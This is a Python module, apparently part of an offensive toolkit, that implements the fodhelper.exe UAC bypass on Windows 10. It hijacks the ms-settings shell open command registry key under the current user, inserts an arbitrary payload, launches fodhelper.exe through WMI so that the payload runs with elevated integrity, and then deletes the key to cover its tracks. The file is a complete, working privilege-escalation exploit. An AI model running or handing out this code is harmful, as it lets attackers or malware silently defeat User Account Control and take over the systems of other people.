"""
Works from: Windows 10 TH1 (10240)
Fixed in: unfixed
"""
import os
import wmi
import time
import _winreg
import win32con
from core.prints import *

wmi = wmi.WMI()

def fodhelper(payload):
	print """
 --------------------------------------------------------
 fodhelper.exe is an auto-elevated binary that is
 vulnerable to file handler hijacking. 
 
 Read access to HKCU\Software\Classes\ms-settings\shell\open
 \command is performed upon execution. Due to the registry
 key being accessible from user mode, an arbitrary
 executable file can be injected.

 When everything worked correctly, the payload should be
 spawned with high IL.
 --------------------------------------------------------
 """
	print_info("Payload: {}".format(payload))
	print_info("Hijacking Software\\Classes\\ms-settings\\shell\\open\\command")
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Software\Classes\ms-settings\shell\open\command"))
									
		_winreg.SetValueEx(key,
				None,
				0,
				_winreg.REG_SZ,
				payload)

		_winreg.SetValueEx(key,
				"DelegateExecute",
				0,
				_winreg.REG_SZ,
				None)

		_winreg.CloseKey(key)
		print_success("Successfully created Default and DelegateExecute key")
	except Exception as error:
		print_error("Unable to create Default and DelegateExecute key")
		return False

	print_info("Pausing for 5 seconds before executing")
	time.sleep(5)

	print_info("Attempting to create process (cmd.exe /c start fodhelper.exe)")
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start fodhelper.exe",
						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
		if (result[1] == 0):
			print_success("Process started successfully (cmd.exe /c start fodhelper.exe)")
		else:
			print_error("Problem creating process (cmd.exe /c start fodhelper.exe)")
			return False
	except Exception as error:
		print_error("Problem creating process (cmd.exe /c start fodhelper.exe)")
		return False
	
	print_info("Pausing for 5 seconds before cleaning")
	time.sleep(5)

	print_info("Attempting to delete and restore hijacked registry keys")
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
				os.path.join("Software\Classes\ms-settings\shell\open\command"))
		print_success("Successfully, our payload ({}) should now run elevated".format(payload))
	except Exception as error:
		print_error("Unable to clean")
		return False
